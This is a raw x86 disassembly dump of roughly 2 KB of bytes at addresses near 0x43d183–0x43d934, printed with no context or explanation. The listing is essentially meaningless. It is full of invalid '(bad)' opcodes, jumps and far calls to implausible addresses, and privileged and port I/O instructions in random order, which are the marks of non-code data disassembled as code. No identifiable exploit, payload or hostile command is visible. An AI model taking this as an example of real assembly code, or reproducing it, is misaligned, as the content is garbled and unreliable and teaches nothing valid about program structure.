  43d183:	push   esi
  43d184:	sub    BYTE PTR [esi],al
  43d186:	mov    DWORD PTR [eax-0x15029596],ebx
  43d18c:	jmp    0xf2913394
  43d191:	jle    0x43d1c6
  43d193:	and    eax,0xdc4dd665
  43d198:	jb     0x43d1d4
  43d19a:	jp     0x43d174
  43d19c:	mov    ds:0xa106b79f,eax
  43d1a1:	push   ds
  43d1a2:	(bad)  
  43d1a3:	lock stos DWORD PTR es:[edi],eax
  43d1a5:	push   esp
  43d1a6:	adc    eax,0x20bb922b
  43d1ab:	fldl2t 
  43d1ad:	jle    0x43d1e2
  43d1af:	xor    eax,0x9d0eea63
  43d1b4:	stc    
  43d1b5:	jl     0x43d1ea
  43d1b7:	and    eax,0xc3731b52
  43d1bc:	dec    esi
  43d1bd:	jg     0x43d222
  43d1bf:	pop    eax
  43d1c0:	rcl    DWORD PTR [ebx],1
  43d1c2:	(bad)  
  43d1c3:	aam    0x65
  43d1c5:	and    al,0x6b
  43d1c7:	ret    
  43d1c8:	ss dec ebx
  43d1ca:	mov    eax,0xb94f2a4e
  43d1cf:	xchg   esi,eax
  43d1d0:	adc    eax,0x2d9619b8
  43d1d5:	mov    eax,0xb8259619
  43d1da:	sub    DWORD PTR [esi+0x49007eb4],edx
  43d1e0:	daa    
  43d1e1:	mov    al,0x7e
  43d1e3:	mov    al,0xd1
  43d1e5:	xchg   esi,eax
  43d1e6:	outs   dx,BYTE PTR ds:[esi]
  43d1e7:	and    al,0xc3
  43d1e9:	jmp    0x106b8f1
  43d1ee:	bound  ebx,QWORD PTR [eax+0x4d]
  43d1f1:	xor    al,0x63
  43d1f4:	ret    0xe9f7
  43d1f7:	dec    esp
  43d1f8:	std    
  43d1f9:	mov    ebx,edi
  43d1fb:	fldenv [eax]
  43d1fd:	cli    
  43d1fe:	(bad)  
  43d1ff:	enter  0x465d,0x55
  43d203:	out    0xcb,eax
  43d205:	(bad)  
  43d206:	out    0x61,eax
  43d208:	fnstenv [ebx-0xd]
  43d20b:	in     al,0x3f
  43d20d:	add    eax,0x2456d8e9
  43d212:	jmp    0x43d275
  43d214:	fnstcw WORD PTR [ebp-0x50]
  43d217:	enter  0xce56,0xeb
  43d21b:	popa   
  43d21c:	fnstenv [ebx]
  43d21e:	test   eax,0x1b03cbdc
  43d223:	outs   dx,DWORD PTR ds:[esi]
  43d224:	pop    esp
  43d225:	xor    DWORD PTR ds:0x33725910,esp
  43d22c:	xor    eax,0x9585f78c
  43d231:	loopne 0x43d295
  43d233:	dec    ebx
  43d234:	add    DWORD PTR [eax],ecx
  43d236:	lahf   
  43d237:	dec    ebp
  43d238:	rol    BYTE PTR [edx],cl
  43d23a:	sbb    ah,BYTE PTR [edi-0xb42c11b]
  43d240:	(bad)  
  43d242:	or     al,BYTE PTR [eax]
  43d244:	mov    esp,0xe6a94e5d
  43d249:	pop    ss
  43d24a:	dec    ecx
  43d24b:	(bad)  
  43d24c:	(bad)  
  43d24e:	inc    ecx
  43d24f:	iret   
  43d250:	(bad)  
  43d251:	(bad)  
  43d252:	jp     0x43d2b6
  43d254:	mov    esi,DWORD PTR ds:0x5d35b724
  43d25a:	dec    esi
  43d25b:	test   eax,0xa2fc8938
  43d260:	mov    ah,0x10
  43d262:	dec    ecx
  43d263:	bound  edx,QWORD PTR [ebx-0x4fffa0e3]
  43d269:	lock fs xchg dx,ax
  43d26d:	mov    edx,0xf5bd8b3d
  43d272:	jge    0x43d2ca
  43d274:	mov    ebp,DWORD PTR [edi]
  43d276:	idiv   bh
  43d278:	sti    
  43d279:	aad    0x7f
  43d27b:	dec    esi
  43d27c:	cmp    DWORD PTR [esi],0x52
  43d27f:	fs sub bh,0x60
  43d283:	test   DWORD PTR [ebx+0x6d3b3f08],edi
  43d289:	pop    ebp
  43d28a:	idiv   edi
  43d28c:	retf   
  43d28d:	or     al,0x37
  43d28f:	mov    esi,DWORD PTR [ebp-0x1f]
  43d292:	jge    0x43d2e2
  43d294:	iret   
  43d295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d296:	mov    DWORD PTR [ecx-0x8290e],0x77c6b4cb
  43d2a0:	fwait
  43d2a1:	and    eax,0xfe43e853
  43d2a6:	add    BYTE PTR [eax],al
  43d2a8:	add    BYTE PTR [eax],bh
  43d2aa:	cdq    
  43d2ab:	dec    DWORD PTR [eax-0x78a02bb]
  43d2b1:	xchg   BYTE PTR [eax],cl
  43d2b3:	sbb    edi,DWORD PTR [ecx]
  43d2b5:	sbb    eax,0x7bfff845
  43d2ba:	icebp  
  43d2bb:	add    eax,0x73dc0383
  43d2c0:	adc    DWORD PTR [eax],eax
  43d2c2:	daa    
  43d2c3:	sub    esi,DWORD PTR gs:[ebp+0x7bfa7805]
  43d2ca:	in     eax,0x0
  43d2cc:	add    BYTE PTR ds:0x2b7e7fd6,dl
  43d2d2:	ds inc edx
  43d2d4:	js     0x43d28e
  43d2d6:	ins    DWORD PTR es:[edi],dx
  43d2d7:	hlt    
  43d2d8:	push   cs
  43d2d9:	mov    ecx,0x4bfff7e8
  43d2de:	mov    ah,0x41
  43d2e0:	pusha  
  43d2e1:	bound  esi,QWORD PTR [edi-0x4d9c9c80]
  43d2e7:	add    esp,DWORD PTR [edx-0x27]
  43d2ea:	pusha  
  43d2eb:	punpckldq mm1,DWORD PTR [ecx+0x68]
  43d2ef:	pop    ss
  43d2f0:	test   DWORD PTR [esi+edx*2+0x58964974],ebx
  43d2f7:	aam    0xcc
  43d2f9:	fstp   DWORD PTR [eax+0x57]
  43d2fc:	adc    DWORD PTR [edx-0x4e],esp
  43d2ff:	outs   dx,BYTE PTR ds:[esi]
  43d300:	jnp    0x43d36c
  43d302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d303:	jne    0x43d346
  43d305:	push   0xffffff9f
  43d307:	jo     0x43d2ce
  43d309:	fldenv [eax]
  43d30b:	adc    DWORD PTR fs:[eax],eax
  43d30e:	bound  esi,QWORD PTR [edx-0x1c9978df]
  43d314:	jne    0x43d2af
  43d316:	add    ch,BYTE PTR [ecx+0x40d90003]
  43d31c:	mov    WORD PTR [ecx],ss
  43d31e:	bound  esi,QWORD PTR [edx-0x51220331]
  43d324:	add    eax,0x6472f409
  43d329:	(bad)  
  43d32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d32b:	mov    dl,0x3
  43d32d:	(bad)  
  43d32e:	call   DWORD PTR [edx]
  43d330:	adc    al,BYTE PTR [eax]
  43d332:	bound  esi,QWORD PTR [edi-0x4bd708f]
  43d338:	cmp    al,0x0
  43d33a:	cld    
  43d33b:	mov    al,0x7f
  43d33d:	xchg   ecx,eax
  43d33e:	fidiv  DWORD PTR [esi+0x2ee70003]
  43d344:	xchg   edx,eax
  43d345:	xchg   edi,eax
  43d346:	data16 mov dl,0x3
  43d349:	jg     0x43d2ee
  43d34b:	pop    ss
  43d34c:	test   eax,0x35a5dff
  43d351:	call   DWORD PTR [ebp-0x4e]
  43d354:	and    DWORD PTR ds:0x8ef831a,esi
  43d35a:	or     eax,0xf3f830d9
  43d35f:	pop    ecx
  43d360:	leave  
  43d361:	cmp    ah,BYTE PTR [edx+0x5af602d9]
  43d367:	mov    BYTE PTR [eax],bh
  43d369:	ret    0xd83f
  43d36c:	out    dx,al
  43d36d:	jno    0x43d30e
  43d36f:	stc    
  43d370:	mov    bl,0x43
  43d372:	add    BYTE PTR [edx+0x37],ah
  43d375:	jmp    0xe094b701
  43d37a:	add    esp,DWORD PTR [edx+0x54]
  43d37d:	mov    BYTE PTR [bp+di-0x27],dl
  43d381:	jmp    0xa14f8a60
  43d386:	in     eax,dx
  43d387:	jecxz  0x43d401
  43d389:	out    dx,eax
  43d38a:	add    esp,DWORD PTR [edx+0x54]
  43d38d:	daa    
  43d38e:	sub    al,0x6b
  43d390:	gs test al,0x7b
  43d393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d394:	repz cdq 
  43d396:	add    eax,0xc46b4530
  43d39b:	retf   
  43d39c:	push   ecx
  43d39d:	daa    
  43d39e:	sub    al,0xe5
  43d3a0:	or     eax,0xd91c78f2
  43d3a5:	call   0x2f9811ef
  43d3aa:	sbb    BYTE PTR [edi-0x58],ch
  43d3ad:	mul    ch
  43d3af:	out    0x16,al
  43d3b1:	xor    bh,BYTE PTR [ebx+0x2b]
  43d3b4:	and    DWORD PTR [ebx+0x46],esp
  43d3b7:	push   esi
  43d3b8:	lods   al,BYTE PTR ds:[esi]
  43d3b9:	mov    DWORD PTR [ebx+0x1b],edi
  43d3bc:	add    edi,ebp
  43d3be:	ins    DWORD PTR es:[edi],dx
  43d3bf:	sub    edx,ebp
  43d3c1:	jmp    0x43d3b5
  43d3c3:	mov    ah,0xfb
  43d3c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d3c6:	dec    edi
  43d3c7:	out    0xe,eax
  43d3c9:	sahf   
  43d3ca:	jl     0x43d3ef
  43d3cc:	adc    edi,ebp
  43d3ce:	outs   dx,BYTE PTR ds:[esi]
  43d3cf:	popa   
  43d3d0:	sbb    BYTE PTR [ebx],cl
  43d3d2:	retf   0x27de
  43d3d5:	add    DWORD PTR [ecx-0x3a99100],ebp
  43d3db:	xchg   edx,eax
  43d3dc:	dec    esp
  43d3dd:	mov    bh,BYTE PTR [esi]
  43d3df:	xchg   ebp,eax
  43d3e0:	mov    eax,0xa4724910
  43d3e5:	adc    eax,0x1762605f
  43d3ea:	mov    esp,0xd961e8
  43d3ef:	push   es
  43d3f0:	push   esp
  43d3f1:	inc    ecx
  43d3f2:	outs   dx,BYTE PTR ds:[esi]
  43d3f3:	cmp    bl,BYTE PTR [edi+0x23]
  43d3f6:	gs push 0x3b
  43d3f9:	rol    DWORD PTR [eax],1
  43d3fb:	bound  eax,QWORD PTR [ebp+ebp*1-0x40]
  43d3ff:	das    
  43d400:	pop    esi
  43d401:	fld    DWORD PTR [eax]
  43d403:	jmp    0x49826c69
  43d408:	pusha  
  43d409:	fld    DWORD PTR [eax]
  43d40b:	jmp    0xc5212efc
  43d410:	add    al,0xc2
  43d412:	mov    edx,DWORD PTR [edi]
  43d414:	sub    bl,BYTE PTR [edx-0x2e]
  43d417:	xor    ebp,ecx
  43d419:	push   ebp
  43d41a:	inc    esi
  43d41b:	icebp  
  43d41c:	pusha  
  43d41d:	xchg   edi,eax
  43d41e:	jmp    0x43d40b
  43d420:	mov    al,0x97
  43d422:	push   0xffffffe9
  43d424:	cwde   
  43d425:	jl     0x43d477
  43d427:	cmp    BYTE PTR [ecx+esi*4],bl
  43d42a:	pop    ecx
  43d42b:	sub    bl,BYTE PTR [esi-0x27]
  43d42e:	mov    esi,DWORD PTR [edi]
  43d430:	jp     0x43d486
  43d432:	ss push 0xffffffd5
  43d435:	into   
  43d436:	mov    DWORD PTR [edi],esp
  43d438:	sbb    dh,BYTE PTR [ecx-0x43ff8a07]
  43d43e:	ror    DWORD PTR [ebx+0x1144e0ff],0xe9
  43d445:	ins    BYTE PTR es:[edi],dx
  43d446:	pop    ebx
  43d447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d448:	push   esp
  43d449:	(bad)
  43d44d:	jo     0x43d4cd
  43d44f:	pop    ebx
  43d450:	add    BYTE PTR [esi],al
  43d452:	fwait
  43d453:	je     0x43d4d3
  43d455:	xor    ebx,edx
  43d457:	or     DWORD PTR [eax+ebp*4-0x3fffff26],eax
  43d45e:	cld    
  43d45f:	fs mov esi,ebp
  43d462:	mov    cl,0x7d
  43d464:	inc    esp
  43d465:	xor    esi,DWORD PTR [edi+0x7c]
  43d468:	xchg   esi,eax
  43d469:	fwait
  43d46a:	int3   
  43d46b:	add    BYTE PTR [eax],al
  43d46d:	rol    BYTE PTR [esp+eiz*4+0x16],0xb
  43d472:	fisub  DWORD PTR ds:0x3c3cddff
  43d478:	push   ecx
  43d479:	or     BYTE PTR [edi+ecx*4+0x16],0xfb
  43d47e:	fnstcw WORD PTR [ebp-0x72]
  43d481:	jmp    0x43d451
  43d483:	add    BYTE PTR [eax],al
  43d485:	jae    0x43d460
  43d487:	inc    BYTE PTR [eax]
  43d489:	jne    0x43d4c0
  43d48b:	adc    al,BYTE PTR [eax]
  43d48d:	sti    
  43d48e:	les    esi,FWORD PTR [ecx-0x6b25d230]
  43d494:	xchg   esi,eax
  43d495:	das    
  43d496:	aad    0x0
  43d498:	add    BYTE PTR [esi+0x59],al
  43d49b:	xchg   ecx,eax
  43d49c:	xchg   esp,eax
  43d49d:	mov    ebx,0x8b00d9
  43d4a2:	dec    ebp
  43d4a3:	push   ecx
  43d4a4:	adc    DWORD PTR [eax],eax
  43d4a6:	retf   
  43d4a7:	mov    al,ds:0x353d39b4
  43d4ac:	adc    al,BYTE PTR [eax]
  43d4ae:	mov    ebx,0x558b29ee
  43d4b3:	adc    DWORD PTR [ecx+ecx*8+0x467cbc63],eax
  43d4ba:	rcr    eax,cl
  43d4bc:	mov    bh,0xeb
  43d4be:	jns    0x43d488
  43d4c0:	mov    bh,0x8b
  43d4c2:	mov    ebp,0x50005ee5
  43d4c7:	stos   BYTE PTR es:[edi],al
  43d4c8:	inc    ebp
  43d4c9:	push   eax
  43d4ca:	bound  edi,QWORD PTR [esi-0x65]
  43d4cd:	mov    ch,0x20
  43d4cf:	mov    al,0x3
  43d4d1:	test   DWORD PTR [esi+eiz*4-0x91ec688],esp
  43d4d8:	or     al,0x87
  43d4da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d4db:	data16 fwait
  43d4dd:	push   ebp
  43d4de:	dec    esi
  43d4df:	in     al,dx
  43d4e0:	popf   
  43d4e1:	test   BYTE PTR [ecx+esi*4+0x3d],ch
  43d4e5:	ins    BYTE PTR es:[edi],dx
  43d4e6:	xor    eax,0xab7d276d
  43d4eb:	ret    0xe703
  43d4ee:	mov    ebx,cs
  43d4f0:	popf   
  43d4f1:	clc    
  43d4f2:	arpl   WORD PTR [edi+ecx*1-0x7],si
  43d4f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d4f7:	inc    esi
  43d4f8:	jnp    0x43d553
  43d4fa:	jp     0x43d4d5
  43d4fc:	test   eax,0x80ac05fb
  43d501:	jns    0x43d48d
  43d503:	mov    dl,0x27
  43d505:	inc    edx
  43d506:	add    cl,ch
  43d508:	add    al,0x19
  43d50a:	test   DWORD PTR [edx+ebp*8-0x749fbc86],esp
  43d511:	js     0x43d49c
  43d513:	add    bl,BYTE PTR [ebp+0x24e90003]
  43d519:	pop    eax
  43d51a:	adc    DWORD PTR [edx-0x4e],esp
  43d51d:	lock clc 
  43d51f:	cmp    al,0x39
  43d521:	loopne 0x43d568
  43d523:	jmp    0x62553964
  43d528:	mov    dl,0x78
  43d52a:	mov    edx,ecx
  43d52c:	mov    esp,0xb6da0003
  43d531:	adc    bh,bh
  43d533:	call   DWORD PTR [edx]
  43d535:	push   es
  43d536:	add    BYTE PTR [edx-0x55],ah
  43d539:	gs mov edi,0x817fb104
  43d53f:	out    dx,al
  43d540:	mov    dl,0x3
  43d542:	add    bh,ch
  43d544:	fldenv [ebp+0x7d]
  43d547:	rcr    ecx,1
  43d549:	jmp    0xc27fba51
  43d54e:	js     0x43d573
  43d550:	sub    eax,0xc1debb63
  43d555:	jmp    0x43d588
  43d557:	popa   
  43d558:	sub    bl,0x3
  43d55b:	(bad)  
  43d55c:	fldcw  WORD PTR [edx+0x26]
  43d55f:	push   esi
  43d560:	aad    0x60
  43d562:	jne    0x43d555
  43d564:	loop   0x43d54f
  43d566:	add    esi,DWORD PTR [ecx+0x4d72fe]
  43d56c:	mov    ss,WORD PTR [esi+0x3b]
  43d56f:	sub    esp,DWORD PTR [ebx+0x50]
  43d572:	xchg   edi,eax
  43d573:	jmp    0x43d593
  43d575:	xchg   edx,eax
  43d576:	adc    al,BYTE PTR [ecx]
  43d578:	inc    edi
  43d579:	xchg   edx,eax
  43d57a:	call   0xfa4d:0x9928cfd8
  43d581:	shr    DWORD PTR [ebx+0x2f506203],1
  43d587:	xor    bh,bl
  43d589:	cli    
  43d58a:	push   0xffffffc8
  43d58c:	pop    ebp
  43d58d:	push   edx
  43d58e:	pop    ds
  43d58f:	inc    eax
  43d590:	cli    
  43d591:	jno    0x43d56d
  43d593:	mov    ds:0xd6d74fda,eax
  43d598:	adc    eax,0x2af42c02
  43d59d:	int3   
  43d59e:	push   esp
  43d59f:	les    ebp,FWORD PTR [ebx]
  43d5a1:	and    BYTE PTR [ebx-0x3c],ch
  43d5a4:	mov    edi,0xfb87ab1c
  43d5a9:	js     0x43d59a
  43d5ab:	add    esp,DWORD PTR [edx-0x27]
  43d5ae:	adc    eax,0x2622dedc
  43d5b3:	mov    DWORD PTR [edi+0x2b8ee740],ebp
  43d5b9:	add    ebx,ebp
  43d5bb:	int    0x86
  43d5bd:	(bad)  
  43d5be:	add    BYTE PTR [edx-0x3dfeca6a],bh
  43d5c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d5c5:	or     edx,DWORD PTR [edx-0x41]
  43d5c8:	leave  
  43d5c9:	jge    0x43d60c
  43d5cb:	jmp    0xc5822c31
  43d5d0:	add    ah,dl
  43d5d2:	add    DWORD PTR [ebp+eiz*1-0x5ac1abaa],eax
  43d5d9:	or     DWORD PTR ds:0x56013ef4,ebx
  43d5df:	push   es
  43d5e0:	push   0x67
  43d5e2:	jmp    0x3429b3e7
  43d5e7:	mul    DWORD PTR [esi]
  43d5e9:	add    DWORD PTR [edx],esp
  43d5eb:	push   edi
  43d5ec:	jb     0x43d613
  43d5ee:	es push esi
  43d5f0:	sub    dl,BYTE PTR [edx]
  43d5f2:	pop    esp
  43d5f4:	sbb    eax,0x35c48f32
  43d5f9:	xor    cl,BYTE PTR [edi-0x70cdd23c]
  43d5ff:	les    ebx,FWORD PTR [esp+edx*8-0x6369ac52]
  43d606:	mov    ebx,0x4e61e9f7
  43d60b:	fwait
  43d60c:	jmp    0x6244af72
  43d611:	inc    ebx
  43d612:	inc    ebp
  43d613:	or     dh,0x67
  43d616:	mov    edx,0xf578e9f7
  43d61b:	mov    edi,DWORD PTR [edi-0x4911ef07]
  43d621:	add    BYTE PTR [esi+0x76],dl
  43d624:	xor    eax,0xe802c1e7
  43d629:	popa   
  43d62a:	fldcw  WORD PTR [edi-0xd]
  43d62d:	in     al,0x3f
  43d62f:	or     ecx,ebp
  43d631:	push   eax
  43d632:	push   ebp
  43d633:	shr    eax,cl
  43d635:	add    BYTE PTR [ecx-0x27],ah
  43d638:	jge    0x43d63a
  43d63a:	fsubr  st(7),st
  43d63c:	jl     0x43d60f
  43d63e:	jp     0x43d616
  43d640:	add    bh,al
  43d642:	xor    eax,0x8b0000f5
  43d647:	(bad)  
  43d648:	jne    0x43d649
  43d64a:	mov    bh,ah
  43d64c:	jbe    0x43d5f0
  43d64e:	jnp    0x43d626
  43d650:	add    BYTE PTR [ebx-0x3f7c154b],cl
  43d656:	cmp    al,0x52
  43d658:	nop
  43d659:	add    BYTE PTR [ebx-0x2a],cl
  43d65c:	jge    0x43d6b4
  43d65e:	arpl   dx,dx
  43d660:	ror    BYTE PTR [edi],1
  43d662:	lds    ecx,FWORD PTR [edx+edi*8]
  43d665:	lea    ecx,[ecx]
  43d667:	ja     0x43d65d
  43d669:	ret    0x202c
  43d66c:	adc    BYTE PTR [ebx],bh
  43d66e:	jo     0x43d651
  43d670:	jnp    0x43d681
  43d672:	test   esi,edi
  43d674:	idiv   DWORD PTR [edx]
  43d676:	inc    eax
  43d677:	loope  0x43d6ec
  43d679:	andnps xmm7,xmm6
  43d67c:	test   BYTE PTR [edx-0x34d22bc5],0x86
  43d683:	in     al,dx
  43d684:	ja     0x43d648
  43d686:	or     ebp,edx
  43d688:	add    BYTE PTR [eax],al
  43d68a:	in     al,dx
  43d68b:	pop    ds
  43d68c:	push   eax
  43d68d:	add    DWORD PTR [ebx],edi
  43d68f:	pushf  
  43d690:	mov    esp,0xb2e83875
  43d695:	pop    eax
  43d696:	retf   0x2e15
  43d699:	retf   
  43d69a:	add    BYTE PTR [esi-0x7c49f765],dl
  43d6a0:	(bad)  
  43d6a1:	inc    eax
  43d6a2:	cmp    eax,DWORD PTR [eax]
  43d6a4:	loop   0x43d6cd
  43d6a6:	sysexit 
  43d6a8:	std    
  43d6a9:	idiv   DWORD PTR [edi]
  43d6ab:	ror    BYTE PTR [edx+esi*2+0x501fbc28],0x1
  43d6b3:	(bad)  
  43d6b4:	lock aad 0xc4
  43d6b7:	pop    ss
  43d6b8:	stos   DWORD PTR es:[edi],eax
  43d6b9:	adc    BYTE PTR [edx+0x3543b13a],dh
  43d6bf:	cdq    
  43d6c0:	(bad)  
  43d6c1:	stc    
  43d6c2:	or     ah,cl
  43d6c4:	out    0x3,eax
  43d6c6:	inc    eax
  43d6c7:	cmp    DWORD PTR [edi+0xf],esi
  43d6ca:	or     esp,DWORD PTR [ebp+0x5a]
  43d6cd:	xor    al,0xff
  43d6cf:	sub    eax,0x5e72c5f7
  43d6d4:	out    0xbe,eax
  43d6d6:	ins    DWORD PTR es:[edi],dx
  43d6d7:	push   ss
  43d6d8:	fdivr  QWORD PTR [esi+0x3c16002]
  43d6de:	add    bl,bl
  43d6e0:	and    BYTE PTR [ebx],0xb5
  43d6e3:	arpl   dx,ax
  43d6e5:	add    eax,DWORD PTR [eax]
  43d6e7:	jns    0x43d6e8
  43d6e9:	sbb    al,BYTE PTR [esi]
  43d6eb:	jmp    0x43d66d
  43d6ed:	and    esp,ebp
  43d6ef:	cmp    eax,DWORD PTR [si]
  43d6f2:	add    BYTE PTR [edx-0x3e],ah
  43d6f5:	jl     0x43d770
  43d6f7:	add    bl,0x84
  43d6fa:	xchg   ecx,eax
  43d6fb:	ret    0x398
  43d6fe:	add    BYTE PTR [eax],al
  43d700:	nop
  43d701:	sub    eax,0x3b824186
  43d706:	xchg   ebx,eax
  43d707:	mov    ds:0x2c03c254,eax
  43d70c:	popa   
  43d70d:	sub    edx,DWORD PTR [ebp+0x33d6db61]
  43d713:	test   esp,edx
  43d715:	(bad)  
  43d716:	stc    
  43d717:	(bad)  
  43d718:	fnstsw WORD PTR [ebx]
  43d71a:	jp     0x43d6b3
  43d71c:	ins    BYTE PTR es:[edi],dx
  43d71d:	ret    0x8803
  43d720:	data16 lods al,BYTE PTR ds:[esi]
  43d722:	add    bl,BYTE PTR [edx+0x39902]
  43d728:	ins    DWORD PTR es:[edi],dx
  43d729:	xor    BYTE PTR [eax+ecx*1-0x1c942614],dh
  43d730:	es sbb edx,ebp
  43d733:	sub    DWORD PTR [ebp+0x617b6754],esp
  43d739:	fldl2t 
  43d73b:	mov    fs,ecx
  43d73d:	pop    edi
  43d73e:	popa   
  43d73f:	pop    es
  43d740:	(bad)  
  43d741:	(bad)  
  43d743:	pop    ecx
  43d744:	pusha  
  43d745:	stc    
  43d746:	and    BYTE PTR [edx+eiz*2+0x3f],al
  43d74a:	jmp    0xf0a5bace
  43d74f:	add    esp,DWORD PTR [edx+0x64]
  43d752:	addr16 jg 0x43d7a8
  43d755:	fldl2t 
  43d757:	mov    WORD PTR [ebx-0x7932fcc7],fs
  43d75d:	mov    eax,DWORD PTR [eax]
  43d75f:	xchg   edx,eax
  43d760:	in     eax,dx
  43d761:	into   
  43d762:	jmp    0x1f66d76a
  43d767:	retf   0x6203
  43d76a:	fldl2t 
  43d76c:	adc    dh,cl
  43d76e:	call   0x2f9f:0xdab649d0
  43d775:	fbld   TBYTE PTR [edx+0x26e73602]
  43d77b:	jbe    0x43d709
  43d77d:	mov    ds:0x5a0773f1,eax
  43d782:	fs addr16 addr16 jae 0x43d760
  43d787:	jmp    0x6182d260
  43d78c:	fbld   TBYTE PTR [esp+eiz*2-0x26ac9b91]
  43d793:	jmp    0xf794ab22
  43d798:	add    esp,DWORD PTR [edx+0x61]
  43d79b:	fisttp QWORD PTR [ecx]
  43d79d:	aad    0x55
  43d79f:	mov    esi,esi
  43d7a1:	int    0xb7
  43d7a3:	out    0x55,al
  43d7a5:	xchg   ebp,eax
  43d7a6:	ds add eax,ebp
  43d7a9:	cmp    eax,0x61e98c4a
  43d7ae:	fld    DWORD PTR [ebp+0x4c346d]
  43d7b4:	jmp    0x75c2361a
  43d7b9:	xchg   esp,eax
  43d7ba:	mov    bh,0xf7
  43d7bc:	ret    0x4a0
  43d7bf:	retf   0xe7c0
  43d7c2:	push   edi
  43d7c3:	push   cs
  43d7c4:	jmp    0xa8d0ba2a
  43d7c9:	add    ch,bl
  43d7cb:	and    DWORD PTR [ebp-0x18],ebp
  43d7ce:	aaa    
  43d7cf:	inc    ebp
  43d7d0:	jle    0x43d802
  43d7d2:	pop    ebp
  43d7d3:	pop    ebp
  43d7d4:	inc    ecx
  43d7d5:	pop    edi
  43d7d6:	lds    esi,FWORD PTR [eax+0x5a9da78b]
  43d7dc:	leave  
  43d7dd:	rcr    DWORD PTR [esp+ebx*2+0x3e],1
  43d7e1:	add    DWORD PTR [ecx+0x76],esp
  43d7e4:	jmp    0x43d7d1
  43d7e6:	xor    BYTE PTR [edi-0x75],dh
  43d7e9:	lahf   
  43d7ea:	lea    edi,[edi]
  43d7ec:	add    DWORD PTR [edx],eax
  43d7ee:	out    dx,eax
  43d7ef:	and    al,0x51
  43d7f1:	mov    edi,0xe93754f9
  43d7f6:	popa   
  43d7f7:	pop    esp
  43d7f8:	ds test eax,ebp
  43d7fb:	lock and DWORD PTR ds:0xa53e600e,0xffffffb9
  43d803:	hlt    
  43d804:	icebp  
  43d805:	(bad)  
  43d806:	in     al,0x5d
  43d808:	push   es
  43d809:	push   0x5f
  43d80b:	leave  
  43d80c:	add    dh,bl
  43d80e:	jmp    0x3411:0xcce6f6d8
  43d815:	test   eax,0x6ac41228
  43d81a:	and    cl,0xfc
  43d81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d81e:	fild   QWORD PTR [edx+0xe]
  43d821:	add    BYTE PTR [ebx-0x44ffff26],bh
  43d827:	fidiv  DWORD PTR [ebx+0x3f]
  43d82a:	inc    eax
  43d82b:	and    al,0x55
  43d82d:	test   DWORD PTR [eax],eax
  43d82f:	add    dl,bl
  43d831:	add    DWORD PTR [ebx-0x3f0b6a83],ecx
  43d837:	rcr    al,1
  43d839:	and    eax,0x64ec00c0
  43d83e:	push   ebx
  43d83f:	mov    al,ds:0x6d50456d
  43d844:	test   DWORD PTR [ebp+0x3f],eax
  43d847:	jnp    0x43d823
  43d849:	jge    0x43d891
  43d84b:	bound  edi,QWORD PTR [bx+di]
  43d84e:	cmp    DWORD PTR [edi-0x58b98156],0xffffff82
  43d855:	in     eax,0xf0
  43d857:	add    al,0x57
  43d859:	jl     0x43d869
  43d85b:	js     0x43d7fa
  43d85d:	cs inc ecx
  43d85f:	pop    ebx
  43d860:	test   DWORD PTR [ecx],0x75f37b95
  43d866:	sar    BYTE PTR [ecx],0x19
  43d869:	mov    dh,0x83
  43d86b:	mov    ch,0x3a
  43d86d:	adc    al,BYTE PTR [eax]
  43d86f:	dec    ebx
  43d870:	fisubr DWORD PTR [ebx+edi*1-0x50]
  43d874:	and    al,0x55
  43d876:	test   DWORD PTR [edx-0x2e],esi
  43d879:	add    DWORD PTR [ebx-0x3f0b6e33],ecx
  43d87f:	pusha  
  43d880:	fsub   DWORD PTR ds:0x64ec90c0
  43d886:	push   0xfffffffb
  43d888:	ret    0x52c6
  43d88b:	fucomi st,st(3)
  43d88d:	call   0x11d9c9b
  43d892:	mov    eax,DWORD PTR [eax]
  43d894:	cmp    eax,0x783e7de9
  43d899:	mov    eax,ds:0x6628907
  43d89e:	inc    ecx
  43d89f:	call   0xf8d968af
  43d8a4:	fldcw  WORD PTR [ebp-0x3f8d8980]
  43d8aa:	add    al,0x84
  43d8ac:	inc    ebp
  43d8ad:	outs   dx,DWORD PTR ds:[esi]
  43d8ae:	xchg   ebp,eax
  43d8af:	clc    
  43d8b0:	adc    eax,0xf54c23b
  43d8b5:	adc    eax,0xffffffcb
  43d8b8:	xchg   esi,eax
  43d8b9:	adc    eax,0xffffffcb
  43d8bc:	scas   al,BYTE PTR es:[edi]
  43d8bd:	hlt    
  43d8be:	mov    ebx,ebp
  43d8c0:	sub    eax,0x62741743
  43d8c5:	mov    ch,0xf2
  43d8c7:	test   BYTE PTR [edi+eax*2+0x2e7ded65],al
  43d8ce:	cmp    BYTE PTR [ecx-0x12],0xbf
  43d8d2:	add    al,0x84
  43d8d4:	(bad)  
  43d8d5:	mov    edi,0x7dd90003
  43d8da:	daa    
  43d8db:	test   DWORD PTR [edx+ecx*8-0x52fd6e77],ebp
  43d8e2:	add    eax,DWORD PTR [eax]
  43d8e4:	and    eax,0x62002385
  43d8e9:	ret    0x8603
  43d8ec:	mov    dx,0x8988
  43d8f0:	dec    BYTE PTR [ebx+eax*1+0x1efb7100]
  43d8f7:	xchg   DWORD PTR [eax],eax
  43d8f9:	data16 jno 0x43d884
  43d8fc:	mov    edx,eax
  43d8fe:	mov    ah,0x3
  43d900:	add    cl,ch
  43d902:	sub    al,0x75
  43d904:	adc    DWORD PTR [edx-0x3e],esp
  43d907:	mov    eax,DWORD PTR [ebx]
  43d909:	pop    eax
  43d90a:	ret    
  43d90b:	dec    ebp
  43d90c:	iret   
  43d90d:	mov    ebx,0x620003c1
  43d912:	rol    DWORD PTR [ebp-0x1626ab61],0x3
  43d919:	sbb    dl,0x65
  43d91c:	jne    0x43d90f
  43d91e:	fldl2t 
  43d920:	add    edx,ebp
  43d922:	es ss popf 
  43d925:	sbb    ebp,DWORD PTR ds:0x4df3876d
  43d92b:	jmp    0x57a43b33
  43d930:	jg     0x43d985
  43d932:	fldl2t 
  43d934:	mov    BYTE PTR [ebx],ah
